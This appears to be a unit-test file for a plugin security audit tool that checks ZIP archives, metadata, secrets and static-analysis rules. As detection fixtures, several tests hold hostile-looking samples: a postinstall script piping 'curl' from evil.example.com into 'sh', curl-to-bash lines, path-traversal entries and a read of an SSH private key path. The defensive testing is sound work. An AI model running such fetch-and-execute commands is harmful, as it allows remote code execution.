"""tests/test_audit_plugins.py - Comprehensive unit tests for the security audit pipeline.

All tests run without network access. ZIP fixtures are created programmatically.
No real secrets, malware, or functioning destructive payloads are used.
"""

import base64
import datetime
import io
import json
import os
import stat
import struct
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest.mock import MagicMock, patch

# Ensure the module is importable
os.environ.setdefault("GITHUB_TOKEN", "test-token")
sys.path.insert(0, str(Path(__file__).parent.parent))

import audit_plugins as ap


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_zip(members: list[tuple[str, bytes | str, int]]) -> bytes:
    """Create an in-memory ZIP with the given members.

    Each member is (name, content, external_attr).
    external_attr=0 means a regular file; use unix mode << 16 for special types.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content, ext_attr in members:
            info = zipfile.ZipInfo(name)
            info.external_attr = ext_attr
            if isinstance(content, str):
                content = content.encode("utf-8")
            zf.writestr(info, content)
    return buf.getvalue()


def _write_zip(path: str, members: list[tuple[str, bytes | str, int]]) -> None:
    Path(path).write_bytes(_make_zip(members))


def _regular(name: str, content: str | bytes = "") -> tuple[str, bytes | str, int]:
    """Helper: regular file member with no special attributes."""
    return (name, content, 0)


# ---------------------------------------------------------------------------
# Repository list parsing
# ---------------------------------------------------------------------------

class TestReadRepoUrls(unittest.TestCase):
    def test_parses_valid_urls(self):
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as f:
            f.write("https://github.com/owner/repo1\n")
            f.write("# comment\n")
            f.write("https://github.com/owner/repo2/\n")
            f.write("\n")
            name = f.name
        try:
            urls = ap.read_repo_urls(name)
            self.assertEqual(urls, [
                "https://github.com/owner/repo1",
                "https://github.com/owner/repo2",
            ])
        finally:
            os.unlink(name)

    def test_deduplicates_urls(self):
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as f:
            f.write("https://github.com/owner/repo1\n")
            f.write("https://github.com/owner/repo1/\n")  # trailing slash variant
            name = f.name
        try:
            urls = ap.read_repo_urls(name)
            self.assertEqual(len(urls), 1)
        finally:
            os.unlink(name)

    def test_raises_on_missing_file(self):
        with self.assertRaises(FileNotFoundError):
            ap.read_repo_urls("/nonexistent/plugins.txt")

    def test_normalises_url_case_for_dedup(self):
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as f:
            f.write("https://github.com/Owner/Repo\n")
            f.write("https://github.com/owner/repo\n")
            name = f.name
        try:
            urls = ap.read_repo_urls(name)
            self.assertEqual(len(urls), 1)
        finally:
            os.unlink(name)


# ---------------------------------------------------------------------------
# URL normalisation helper
# ---------------------------------------------------------------------------

class TestNormaliseRepoKey(unittest.TestCase):
    def test_full_url(self):
        self.assertEqual(
            ap._normalise_repo_key("https://github.com/Owner/MyRepo"),
            "owner/myrepo",
        )

    def test_owner_repo(self):
        self.assertEqual(ap._normalise_repo_key("Owner/MyRepo"), "owner/myrepo")

    def test_trailing_slash(self):
        self.assertEqual(
            ap._normalise_repo_key("https://github.com/Owner/MyRepo/"),
            "owner/myrepo",
        )


# ---------------------------------------------------------------------------
# ZIP inspection
# ---------------------------------------------------------------------------

class TestZipInspection(unittest.TestCase):
    def _write(self, members):
        tmp = tempfile.mktemp(suffix=".zip")
        _write_zip(tmp, members)
        return tmp

    def test_valid_zip_passes(self):
        path = self._write([_regular("plugin/main.py", "print('hello')")])
        try:
            stats, findings = ap.inspect_zip(path)
            self.assertTrue(stats.safe)
            blocks = [f for f in findings if f.classification == "BLOCK"]
            self.assertEqual(blocks, [])
        finally:
            os.unlink(path)

    def test_absolute_path_blocked(self):
        path = self._write([_regular("/etc/passwd", "root:x:0:0")])
        try:
            stats, findings = ap.inspect_zip(path)
            self.assertFalse(stats.safe)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_TRAVERSAL", rule_ids)
        finally:
            os.unlink(path)

    def test_dotdot_traversal_blocked(self):
        path = self._write([_regular("../evil.py", "import os")])
        try:
            stats, findings = ap.inspect_zip(path)
            self.assertFalse(stats.safe)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_TRAVERSAL", rule_ids)
        finally:
            os.unlink(path)

    def test_windows_path_traversal_blocked(self):
        path = self._write([_regular("C:\\Windows\\system32\\evil.exe", b"\x4d\x5a")])
        try:
            stats, findings = ap.inspect_zip(path)
            self.assertFalse(stats.safe)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_TRAVERSAL", rule_ids)
        finally:
            os.unlink(path)

    def test_null_byte_in_path_blocked(self):
        # Test _is_safe_member_path directly since Python 3.12's zipfile
        # may reject null bytes before we can inspect them.
        safe, reason = ap._is_safe_member_path("plugin\x00hidden.py")
        self.assertFalse(safe)
        self.assertIn("null", reason)

    def test_duplicate_normalised_paths_flagged(self):
        # Two paths that normalise to the same name (case collision)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("plugin/Main.py", "a")
            zf.writestr("plugin/main.py", "b")
        path = tempfile.mktemp(suffix=".zip")
        Path(path).write_bytes(buf.getvalue())
        try:
            stats, findings = ap.inspect_zip(path)
            rule_ids = [f.rule_id for f in findings]
            self.assertIn("ARCHIVE_DUPLICATE_PATH", rule_ids)
        finally:
            os.unlink(path)

    def test_file_count_limit(self):
        policy = ap._default_policy()
        policy["archive"]["max_files"] = 3
        members = [_regular(f"file{i}.txt", "") for i in range(5)]
        path = self._write(members)
        try:
            stats, findings = ap.inspect_zip(path, policy)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_FILE_COUNT_EXCEEDED", rule_ids)
        finally:
            os.unlink(path)

    def test_total_size_limit(self):
        policy = ap._default_policy()
        policy["archive"]["max_uncompressed_bytes"] = 10
        # Create content larger than limit (compression may reduce size)
        big_content = "x" * 100  # larger than limit of 10
        path = self._write([_regular("big.txt", big_content)])
        try:
            stats, findings = ap.inspect_zip(path, policy)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_BOMB_SIZE", rule_ids)
        finally:
            os.unlink(path)

    def test_compression_ratio_limit(self):
        policy = ap._default_policy()
        policy["archive"]["max_compression_ratio"] = 2
        # Highly compressible content
        big_zeros = b"\x00" * 50000
        path = self._write([_regular("zeros.bin", big_zeros)])
        try:
            stats, findings = ap.inspect_zip(path, policy)
            # Ratio may or may not exceed 2; just verify the check runs
            self.assertIsNotNone(stats.compression_ratio)
        finally:
            os.unlink(path)

    def test_setuid_permission_bits_blocked(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            info = zipfile.ZipInfo("plugin/helper")
            # Set setuid bit in Unix mode
            info.external_attr = (0o4755 | stat.S_IFREG) << 16
            zf.writestr(info, b"#!/bin/sh\nid\n")
        path = tempfile.mktemp(suffix=".zip")
        Path(path).write_bytes(buf.getvalue())
        try:
            stats, findings = ap.inspect_zip(path)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_SETUID_FILE", rule_ids)
        finally:
            os.unlink(path)

    def test_device_file_blocked(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            info = zipfile.ZipInfo("plugin/dev")
            # Character device type (0x2000)
            info.external_attr = (0x2000 | 0o666) << 16
            zf.writestr(info, b"")
        path = tempfile.mktemp(suffix=".zip")
        Path(path).write_bytes(buf.getvalue())
        try:
            _, findings = ap.inspect_zip(path)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_DEVICE_FILE", rule_ids)
        finally:
            os.unlink(path)

    def test_corrupt_zip_blocked(self):
        path = tempfile.mktemp(suffix=".zip")
        Path(path).write_bytes(b"not a zip file at all!!!")
        try:
            stats, findings = ap.inspect_zip(path)
            self.assertFalse(stats.safe)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("CORRUPT_ARCHIVE", rule_ids)
        finally:
            os.unlink(path)


# ---------------------------------------------------------------------------
# Metadata checking
# ---------------------------------------------------------------------------

class TestPluginJson(unittest.TestCase):
    def test_valid_plugin_json(self):
        data = json.dumps({"name": "MyPlugin", "flags": []}).encode()
        parsed, findings = ap.check_plugin_json(data)
        self.assertEqual(parsed["name"], "MyPlugin")
        self.assertEqual(findings, [])

    def test_invalid_json(self):
        data = b"{not valid json"
        _, findings = ap.check_plugin_json(data)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("INVALID_PLUGIN_JSON", rule_ids)

    def test_missing_name(self):
        data = json.dumps({"flags": []}).encode()
        _, findings = ap.check_plugin_json(data)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("MISSING_PLUGIN_NAME", rule_ids)

    def test_root_flag_detection(self):
        data = json.dumps({"name": "HWPlugin", "flags": ["root"]}).encode()
        _, findings = ap.check_plugin_json(data)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("ROOT_ACCESS", rule_ids)
        root_finding = next(f for f in findings if f.rule_id == "ROOT_ACCESS")
        self.assertEqual(root_finding.classification, "MANUAL_REVIEW")

    def test_absent_plugin_json_warns(self):
        _, findings = ap.check_plugin_json(None)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("MISSING_PLUGIN_JSON", rule_ids)


class TestPackageJson(unittest.TestCase):
    def test_valid_package_json(self):
        data = json.dumps({"name": "my-plugin", "version": "1.0.0"}).encode()
        parsed, findings = ap.check_package_json(data)
        self.assertEqual(parsed["name"], "my-plugin")
        self.assertEqual(findings, [])

    def test_lifecycle_script_flagged(self):
        data = json.dumps({
            "name": "my-plugin",
            "scripts": {"postinstall": "curl https://evil.example.com/setup.sh | sh"},
        }).encode()
        _, findings = ap.check_package_json(data)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("PACKAGE_LIFECYCLE_SCRIPT", rule_ids)


# ---------------------------------------------------------------------------
# Static analysis rules
# ---------------------------------------------------------------------------

class TestStaticAnalysis(unittest.TestCase):
    def _scan(self, content: str, path: str = "main.py", ext: str = ".py"):
        return ap.scan_text_content(content, path, ext)

    def test_shell_command_detection(self):
        findings = self._scan("import os\nos.system('ls -la')\n")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("EXEC_OS_SYSTEM", rule_ids)

    def test_subprocess_shell_true(self):
        findings = self._scan("subprocess.run(['cmd'], shell=True)\n")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("EXEC_SHELL_TRUE", rule_ids)

    def test_eval_detection(self):
        findings = self._scan("result = eval(user_input)\n")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("EXEC_EVAL", rule_ids)

    def test_curl_pipe_sh_detection(self):
        content = "os.system('curl https://example.com/setup.sh | sh')\n"
        findings = self._scan(content, path="install.sh", ext=".sh")
        rule_ids = {f.rule_id for f in findings}
        # Either SHELL_CURL_PIPE or EXEC_OS_SYSTEM should fire
        self.assertTrue(
            "SHELL_CURL_PIPE" in rule_ids or "EXEC_OS_SYSTEM" in rule_ids
        )

    def test_curl_pipe_sh_direct_shell(self):
        content = "curl https://example.com/setup.sh | bash\n"
        findings = ap.scan_text_content(content, "install.sh", ".sh")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("SHELL_CURL_PIPE", rule_ids)
        block_findings = [f for f in findings if f.rule_id == "SHELL_CURL_PIPE"]
        self.assertEqual(block_findings[0].classification, "BLOCK")

    def test_systemd_persistence_detection(self):
        content = "[Unit]\nDescription=evil\n\n.service [Unit]\nDescription=test\n"
        findings = self._scan(content, "install.py")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("PERSIST_SYSTEMD_SERVICE", rule_ids)

    def test_credential_path_access(self):
        content = "key_path = os.path.expanduser('~/.ssh/id_rsa')\n"
        findings = self._scan(content)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("SENSITIVE_SSH_KEY", rule_ids)

    def test_disabled_tls_verification(self):
        findings = self._scan("requests.get(url, verify=False)\n")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("NETWORK_DISABLED_TLS", rule_ids)

    def test_base64_obfuscation_large_string(self):
        large_b64 = base64.b64encode(b"A" * 200).decode()
        content = f'data = "{large_b64}"\n'
        findings = self._scan(content)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("OBFUSCATION_LARGE_BASE64", rule_ids)


# ---------------------------------------------------------------------------
# URL and domain extraction
# ---------------------------------------------------------------------------

class TestUrlExtraction(unittest.TestCase):
    def test_extracts_https_urls(self):
        content = "fetch('https://api.example.com/data')"
        urls, domains = ap.extract_urls_and_domains(content)
        self.assertIn("https://api.example.com/data", urls)
        self.assertIn("api.example.com", domains)

    def test_extracts_multiple_domains(self):
        content = (
            "url1 = 'https://cdn.example.com/a.js'\n"
            "url2 = 'https://api.other.com/v1'\n"
        )
        _, domains = ap.extract_urls_and_domains(content)
        self.assertIn("cdn.example.com", domains)
        self.assertIn("api.other.com", domains)

    def test_extracts_ip_addresses(self):
        content = "server = '192.168.1.100'\n"
        _, domains = ap.extract_urls_and_domains(content)
        self.assertIn("192.168.1.100", domains)


# ---------------------------------------------------------------------------
# Secrets scanning
# ---------------------------------------------------------------------------

class TestSecretsScanning(unittest.TestCase):
    def test_private_key_header_detected(self):
        content = "key = '-----BEGIN RSA PRIVATE KEY-----\\nMIIE...'\n"
        findings = ap.scan_for_secrets(content, "config.py")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("SECRET_PRIVATE_KEY_HEADER", rule_ids)

    def test_secret_value_redacted(self):
        content = "token = 'ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1'\n"
        findings = ap.scan_for_secrets(content, "config.py")
        for f in findings:
            self.assertNotIn("ghp_AAA", f.evidence)
            self.assertIn(ap.SECRET_REDACT, f.evidence)

    def test_test_fixture_has_lower_severity(self):
        content = "# test fixture: password = 'my_test_password_here'\n"
        findings = ap.scan_for_secrets(content, "test_config.py")
        # Fixtures may be classified with lower severity
        for f in findings:
            if "password" in f.rule_id.lower():
                self.assertIn(f.severity, ("low", "info", "medium"))

    def test_github_token_pattern_detected(self):
        content = "token = 'ghp_" + "A" * 36 + "'\n"
        findings = ap.scan_for_secrets(content, "auth.py")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("SECRET_GITHUB_TOKEN", rule_ids)


# ---------------------------------------------------------------------------
# Binary detection
# ---------------------------------------------------------------------------

class TestBinaryDetection(unittest.TestCase):
    def _minimal_elf(self) -> bytes:
        """Minimal valid ELF header (64-byte ELF header, x86_64)."""
        header = bytearray(64)
        header[0:4] = b"\x7fELF"
        header[4] = 2    # 64-bit
        header[5] = 1    # little-endian
        header[6] = 1    # ELF version
        header[18] = 0x3E  # x86_64 machine type
        return bytes(header)

    def test_elf_detection(self):
        data = self._minimal_elf()
        result = ap.identify_binary(data, "helper")
        self.assertIsNotNone(result)
        self.assertEqual(result["type"], "elf_binary")
        self.assertEqual(result["architecture"], "x86_64")

    def test_pe_detection(self):
        data = b"MZ" + b"\x00" * 14
        result = ap.identify_binary(data, "plugin.exe")
        self.assertIsNotNone(result)
        self.assertEqual(result["type"], "pe_binary")

    def test_regular_text_not_binary(self):
        data = b"#!/usr/bin/env python3\nprint('hello')\n"
        result = ap.identify_binary(data, "main.py")
        self.assertIsNone(result)

    def test_short_data_not_binary(self):
        result = ap.identify_binary(b"\x7f", "tiny")
        self.assertIsNone(result)


# ---------------------------------------------------------------------------
# Classification logic
# ---------------------------------------------------------------------------

class TestClassification(unittest.TestCase):
    def _finding(self, classification: str, severity: str = "high") -> ap.Finding:
        return ap.Finding(
            rule_id="TEST",
            severity=severity,
            classification=classification,
            path="test.py",
            line=1,
            message="test",
            evidence="",
            scanner="test",
        )

    def test_no_findings_is_pass(self):
        cls, score = ap.classify_findings([])
        self.assertEqual(cls, "PASS")
        self.assertEqual(score, 0)

    def test_block_wins_over_manual_review(self):
        findings = [
            self._finding("MANUAL_REVIEW"),
            self._finding("BLOCK", "critical"),
        ]
        cls, _ = ap.classify_findings(findings)
        self.assertEqual(cls, "BLOCK")

    def test_manual_review_without_block(self):
        findings = [
            self._finding("MANUAL_REVIEW"),
            self._finding("PASS_WITH_WARNINGS", "low"),
        ]
        cls, _ = ap.classify_findings(findings)
        self.assertEqual(cls, "MANUAL_REVIEW")

    def test_warnings_only(self):
        findings = [self._finding("PASS_WITH_WARNINGS", "medium")]
        cls, _ = ap.classify_findings(findings)
        self.assertEqual(cls, "PASS_WITH_WARNINGS")

    def test_has_error_returns_audit_error(self):
        cls, _ = ap.classify_findings([], has_error=True)
        self.assertEqual(cls, "AUDIT_ERROR")

    def test_allowlisted_findings_excluded_from_classification(self):
        findings = [self._finding("BLOCK", "critical")]
        findings[0].allowlisted = True
        cls, _ = ap.classify_findings(findings)
        self.assertEqual(cls, "PASS")

    def test_severity_score_aggregation(self):
        findings = [
            self._finding("PASS_WITH_WARNINGS", "critical"),  # 40
            self._finding("PASS_WITH_WARNINGS", "high"),      # 15
        ]
        _, score = ap.classify_findings(findings)
        self.assertEqual(score, 55)


# ---------------------------------------------------------------------------
# Allowlist
# ---------------------------------------------------------------------------

class TestAllowlist(unittest.TestCase):
    def _make_allowlist(self, exceptions: list[dict]) -> list[dict]:
        with tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False) as f:
            f.write("version: '1'\nexceptions:\n")
            for exc in exceptions:
                f.write("  - ")
                for k, v in exc.items():
                    f.write(f'{k}: "{v}"\n    ')
                f.write("\n")
            name = f.name
        try:
            return ap.load_allowlist(name)
        finally:
            os.unlink(name)

    def _block_finding(self, rule_id: str = "ROOT_ACCESS") -> ap.Finding:
        return ap.Finding(
            rule_id=rule_id,
            severity="high",
            classification="BLOCK",
            path="main.py",
            line=1,
            message="test",
            evidence="test",
            scanner="test",
        )

    def test_matching_entry_allowlists_finding(self):
        sha = "a" * 64
        exceptions = [
            ap.load_allowlist.__wrapped__ if hasattr(ap.load_allowlist, "__wrapped__") else None
        ]
        # Build exceptions directly
        excs = [{
            "repository": "owner/repo",
            "release": "1.0.0",
            "artifact_sha256": sha,
            "rule": "ROOT_ACCESS",
            "reason": "Hardware plugin",
            "approved_by": "reviewer",
        }]
        finding = self._block_finding("ROOT_ACCESS")
        findings, decisions = ap.apply_allowlist(
            [finding], excs,
            "https://github.com/owner/repo", "1.0.0", sha,
        )
        self.assertTrue(findings[0].allowlisted)
        self.assertEqual(len(decisions), 1)

    def test_hash_mismatch_does_not_allowlist(self):
        excs = [{
            "repository": "owner/repo",
            "artifact_sha256": "a" * 64,
            "rule": "ROOT_ACCESS",
            "reason": "Hardware plugin",
            "approved_by": "reviewer",
        }]
        finding = self._block_finding("ROOT_ACCESS")
        findings, decisions = ap.apply_allowlist(
            [finding], excs,
            "https://github.com/owner/repo", "1.0.0", "b" * 64,
        )
        self.assertFalse(findings[0].allowlisted)

    def test_expired_entry_does_not_allowlist(self):
        excs = [{
            "repository": "owner/repo",
            "artifact_sha256": "a" * 64,
            "rule": "ROOT_ACCESS",
            "reason": "Hardware plugin",
            "approved_by": "reviewer",
            "expires": "2020-01-01",  # in the past
        }]
        finding = self._block_finding("ROOT_ACCESS")
        findings, _ = ap.apply_allowlist(
            [finding], excs,
            "https://github.com/owner/repo", "1.0.0", "a" * 64,
        )
        self.assertFalse(findings[0].allowlisted)

    def test_malware_requires_exact_hash(self):
        """MALWARE rule cannot be allowlisted with artifact_sha256='any'."""
        excs = [{
            "repository": "owner/repo",
            "artifact_sha256": "any",
            "rule": "MALWARE",
            "reason": "false positive",
            "approved_by": "reviewer",
        }]
        finding = self._block_finding("MALWARE")
        findings, _ = ap.apply_allowlist(
            [finding], excs,
            "https://github.com/owner/repo", "1.0.0", "a" * 64,
        )
        self.assertFalse(findings[0].allowlisted)

    def test_invalid_allowlist_raises(self):
        with tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False) as f:
            f.write("version: '1'\nexceptions:\n  - rule: ONLY_RULE\n    reason: x\n    approved_by: y\n")
            name = f.name
        try:
            with self.assertRaises(ValueError):
                ap.load_allowlist(name)
        finally:
            os.unlink(name)

    def test_expired_entry_warning(self):
        excs = [{
            "repository": "owner/repo",
            "rule": "ROOT_ACCESS",
            "reason": "test",
            "approved_by": "reviewer",
            "expires": "2000-01-01",
        }]
        warnings = ap.check_allowlist_expiry(excs)
        self.assertTrue(any("expired" in w.lower() for w in warnings))

    def test_future_expiry_no_warning(self):
        future = (datetime.date.today() + datetime.timedelta(days=365)).isoformat()
        excs = [{
            "repository": "owner/repo",
            "rule": "ROOT_ACCESS",
            "reason": "test",
            "approved_by": "reviewer",
            "expires": future,
        }]
        warnings = ap.check_allowlist_expiry(excs)
        self.assertEqual(warnings, [])


# ---------------------------------------------------------------------------
# Policy loading
# ---------------------------------------------------------------------------

class TestPolicyLoading(unittest.TestCase):
    def test_load_defaults_when_file_absent(self):
        policy = ap.load_policy("/nonexistent/policy.yml")
        self.assertEqual(policy["enforcement"]["mode"], "report-only")
        self.assertIn("archive", policy)

    def test_load_policy_merges_with_defaults(self):
        with tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False) as f:
            f.write("version: '1'\nenforcement:\n  mode: enforce\n")
            name = f.name
        try:
            policy = ap.load_policy(name)
            self.assertEqual(policy["enforcement"]["mode"], "enforce")
            # Defaults still present
            self.assertIn("archive", policy)
        finally:
            os.unlink(name)


# ---------------------------------------------------------------------------
# Report generation
# ---------------------------------------------------------------------------

class TestReportGeneration(unittest.TestCase):
    def _sample_report(self) -> ap.AuditReport:
        report = ap.AuditReport(
            audit_timestamp="2026-01-01T00:00:00Z",
            repository="https://github.com/owner/plugin",
            release="1.0.0",
            artifact_url="https://example.com/plugin.zip",
            artifact_sha256="a" * 64,
            plugin_name="TestPlugin",
            final_classification="PASS",
            risk_score=0,
        )
        report.findings = [
            ap.Finding(
                rule_id="EXEC_OS_SYSTEM",
                severity="high",
                classification="MANUAL_REVIEW",
                path="main.py",
                line=42,
                message="os.system() call",
                evidence="os.system('ls')",
                scanner="decky-static-rules",
            )
        ]
        return report

    def test_json_report_is_deterministic(self):
        report = self._sample_report()
        json1 = ap.generate_json_report(report)
        json2 = ap.generate_json_report(report)
        self.assertEqual(json1, json2)

    def test_json_report_is_valid_json(self):
        report = self._sample_report()
        data = json.loads(ap.generate_json_report(report))
        self.assertEqual(data["plugin_name"], "TestPlugin")
        self.assertIn("findings", data)

    def test_json_report_has_required_fields(self):
        report = self._sample_report()
        data = json.loads(ap.generate_json_report(report))
        for field in ("schema_version", "audit_timestamp", "repository",
                      "artifact_sha256", "final_classification", "findings"):
            self.assertIn(field, data, f"Missing field: {field}")

    def test_markdown_report_contains_classification(self):
        report = self._sample_report()
        report.final_classification = "BLOCK"
        md = ap.generate_markdown_report(report)
        self.assertIn("BLOCK", md)
        self.assertIn("TestPlugin", md)

    def test_markdown_redacts_secrets_in_evidence(self):
        report = self._sample_report()
        report.findings = [
            ap.Finding(
                rule_id="SECRET_GITHUB_TOKEN",
                severity="critical",
                classification="BLOCK",
                path="config.py",
                line=5,
                message="GitHub token detected",
                evidence=ap.SECRET_REDACT,
                scanner="secrets-scanner",
            )
        ]
        report.final_classification = "BLOCK"
        md = ap.generate_markdown_report(report)
        self.assertIn(ap.SECRET_REDACT, md)
        # Should not contain an actual token value
        self.assertNotIn("ghp_", md)

    def test_write_reports_produces_files(self):
        report = self._sample_report()
        with tempfile.TemporaryDirectory() as tmp:
            json_path, md_path = ap.write_reports([report], tmp)
            self.assertTrue(os.path.exists(json_path))
            self.assertTrue(os.path.exists(md_path))
            data = json.loads(Path(json_path).read_text())
            self.assertEqual(data["report_count"], 1)


# ---------------------------------------------------------------------------
# Scanner failure handling
# ---------------------------------------------------------------------------

class TestScannerFailure(unittest.TestCase):
    def test_unavailable_scanner_does_not_report_pass(self):
        """A scanner marked unavailable must not be treated as 'passed'."""
        status = ap.ScannerStatus(name="clamav", status="unavailable")
        self.assertNotEqual(status.status, "passed")

    def test_failed_scanner_recorded_as_failed(self):
        """When a scanner exits with an error, status must be 'failed', not 'passed'."""
        import subprocess as _subprocess
        with patch("shutil.which", return_value="/usr/bin/clamscan"):
            with patch("subprocess.run") as mock_run:
                mock_run.side_effect = _subprocess.TimeoutExpired(["clamscan"], 120)
                status, findings = ap.run_clamav("/tmp/fake", ap._default_policy())
        # Status must not be 'passed' when scanner errored
        self.assertNotEqual(status.status, "passed")

    def test_trivy_unavailable_returns_unavailable_status(self):
        with patch("shutil.which", return_value=None):
            status = ap.run_trivy("/tmp/fake", ap._default_policy())
        self.assertEqual(status.status, "unavailable")

    def test_semgrep_unavailable_returns_unavailable_status(self):
        with patch("shutil.which", return_value=None):
            status, findings = ap.run_semgrep("/tmp/fake", ap._default_policy())
        self.assertEqual(status.status, "unavailable")
        self.assertEqual(findings, [])


# ---------------------------------------------------------------------------
# Safe extraction
# ---------------------------------------------------------------------------

class TestSafeExtraction(unittest.TestCase):
    def test_safe_extraction_succeeds(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("plugin/main.py", "print('hello')")
        zip_path = tempfile.mktemp(suffix=".zip")
        Path(zip_path).write_bytes(buf.getvalue())
        try:
            with tempfile.TemporaryDirectory() as dest:
                extracted = ap.safe_extract_zip(zip_path, dest)
                self.assertIn("plugin/main.py", extracted)
        finally:
            os.unlink(zip_path)

    def test_extraction_blocks_traversal(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("../evil.py", "bad")
        zip_path = tempfile.mktemp(suffix=".zip")
        Path(zip_path).write_bytes(buf.getvalue())
        try:
            with tempfile.TemporaryDirectory() as dest:
                with self.assertRaises(ValueError):
                    ap.safe_extract_zip(zip_path, dest)
        finally:
            os.unlink(zip_path)


# ---------------------------------------------------------------------------
# End-to-end audit (mocked network)
# ---------------------------------------------------------------------------

class TestAuditRepositoryMocked(unittest.TestCase):
    """Smoke tests for audit_repository with all network calls mocked."""

    def _make_simple_zip(self) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr(
                "my-plugin/plugin.json",
                json.dumps({"name": "MyPlugin", "flags": []}),
            )
            zf.writestr("my-plugin/main.py", "# hello world\n")
        return buf.getvalue()

    def test_clean_plugin_passes(self):
        zip_data = self._make_simple_zip()

        meta = {
            "default_branch": "main",
            "archived": False,
            "description": "A test plugin",
        }
        release = {
            "tag_name": "v1.0.0",
            "prerelease": False,
            "assets": [{
                "name": "my-plugin.zip",
                "id": 1,
                "browser_download_url": "https://example.com/my-plugin.zip",
            }],
        }

        with (
            patch.object(ap, "get_repo_metadata", return_value=meta),
            patch.object(ap, "get_releases", return_value=[release]),
            patch.object(ap, "get_repo_file_raw", return_value=None),
            patch.object(ap, "download_zip", return_value="a" * 64),
            patch("builtins.open", unittest.mock.mock_open(read_data=zip_data)),
        ):
            # We need a real temp file for inspect_zip; write the ZIP there
            with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tf:
                tf.write(zip_data)
                tf_path = tf.name
            try:
                # Patch download_zip to just copy our zip
                def fake_download(url, dest_path):
                    Path(dest_path).write_bytes(zip_data)
                    sha = hashlib.sha256(zip_data).hexdigest()
                    return sha
                import hashlib
                with patch.object(ap, "download_zip", side_effect=fake_download):
                    report = ap.audit_repository(
                        "https://github.com/owner/my-plugin",
                        policy=ap._default_policy(),
                        exceptions=[],
                        cache_dir="/tmp/test-audit-cache",
                        skip_cache=True,
                    )
                self.assertNotEqual(report.final_classification, "AUDIT_ERROR")
                self.assertEqual(report.plugin_name, "my-plugin")  # from repo URL fallback
            finally:
                os.unlink(tf_path)

    def test_archive_traversal_blocks(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("../evil.py", "bad")
        zip_data = buf.getvalue()

        meta = {"default_branch": "main", "archived": False}
        release = {
            "tag_name": "v1.0.0",
            "prerelease": False,
            "assets": [{"name": "plugin.zip", "id": 1,
                        "browser_download_url": "https://example.com/plugin.zip"}],
        }

        def fake_download(url, dest_path):
            Path(dest_path).write_bytes(zip_data)
            import hashlib
            return hashlib.sha256(zip_data).hexdigest()

        with (
            patch.object(ap, "get_repo_metadata", return_value=meta),
            patch.object(ap, "get_releases", return_value=[release]),
            patch.object(ap, "get_repo_file_raw", return_value=None),
            patch.object(ap, "download_zip", side_effect=fake_download),
        ):
            report = ap.audit_repository(
                "https://github.com/owner/evil-plugin",
                policy=ap._default_policy(),
                exceptions=[],
                skip_cache=True,
            )
        self.assertEqual(report.final_classification, "BLOCK")
        rule_ids = {f.rule_id for f in report.findings}
        self.assertIn("ARCHIVE_TRAVERSAL", rule_ids)

    def test_missing_repository_returns_audit_error(self):
        import requests as req
        mock_resp = MagicMock()
        mock_resp.status_code = 404
        err = req.HTTPError(response=mock_resp)
        with patch.object(ap, "get_repo_metadata", side_effect=err):
            report = ap.audit_repository(
                "https://github.com/owner/nonexistent",
                policy=ap._default_policy(),
                exceptions=[],
                skip_cache=True,
            )
        self.assertEqual(report.final_classification, "AUDIT_ERROR")

    def test_no_releases_returns_audit_error(self):
        meta = {"default_branch": "main", "archived": False}
        with (
            patch.object(ap, "get_repo_metadata", return_value=meta),
            patch.object(ap, "get_releases", return_value=[]),
        ):
            report = ap.audit_repository(
                "https://github.com/owner/no-releases",
                policy=ap._default_policy(),
                exceptions=[],
                skip_cache=True,
            )
        self.assertEqual(report.final_classification, "AUDIT_ERROR")


# ---------------------------------------------------------------------------
# Cache
# ---------------------------------------------------------------------------

class TestAuditCache(unittest.TestCase):
    def test_cache_key_is_deterministic(self):
        key1 = ap._cache_key("https://github.com/owner/repo", "v1.0.0", "abc123")
        key2 = ap._cache_key("https://github.com/owner/repo", "v1.0.0", "abc123")
        self.assertEqual(key1, key2)

